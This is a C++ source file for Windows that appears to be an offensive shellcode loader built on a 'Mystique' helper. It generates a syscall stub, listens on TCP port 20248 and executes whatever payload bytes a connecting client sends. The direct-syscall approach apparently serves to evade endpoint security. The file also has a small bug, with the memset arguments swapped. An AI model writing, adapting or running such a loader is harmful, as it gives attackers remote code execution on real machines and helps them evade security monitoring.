#include "mystique.h"

int main(int argc, char *argv[])
{
    SOCKET server;
    WSADATA wsa_data;
    sockaddr_in address;

    auto mystique = Mystique();
    mystique.generate_syscall_stub();
    
    printf("[*] Starting the TCP server\n");

    int error = ::WSAStartup(0x101, &wsa_data);
    if(error != 0) {
        return EXIT_FAILURE;
    }

    address.sin_family      = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port        = htons((u_short)20248);

    server = socket(AF_INET,SOCK_STREAM, 0);
    if(server == INVALID_SOCKET) {
        return EXIT_FAILURE;
    }

    error = bind(server, (sockaddr*)&address, sizeof(address));
    if(error != 0)
    {
        closesocket(server);
        ::WSACleanup();
        return EXIT_FAILURE;
    }

    error = listen(server, 10);
    if(error != 0)
    {
        closesocket(server);
        ::WSACleanup();
        return EXIT_FAILURE;
    }

    SOCKET client;
    sockaddr_in from;
    int address_lenght = sizeof(from);

    char payload[4096];
    memset(payload, 4096, 0x0);

    while(true) {
        client = accept(server, (struct sockaddr*)&from, &address_lenght);
        if (client == INVALID_SOCKET) {
            closesocket(client);
            ::WSACleanup();
            return EXIT_FAILURE;
        }
        
        printf("[*] Connection received from %s\n", inet_ntoa(from.sin_addr));

        printf("[*] Reading the payload\n");
        error = recv(client, payload, sizeof(payload), 0);
        if (error > 0) {
            printf("[*] Executing the payload at 0x%p\n", &function_placeholder);
            mystique.write_data(payload, sizeof(payload));
            mystique.execute();

        } else if (error == 0) {
            printf("[*] Connection closing\n");
            closesocket(client);
        } else  {
            printf("[x] recv failed with error: %d\n", ::WSAGetLastError());
            closesocket(client);
            ::WSACleanup();
            return EXIT_FAILURE;
        }
    }

    closesocket(server);
    ::WSACleanup();

    return EXIT_SUCCESS;
}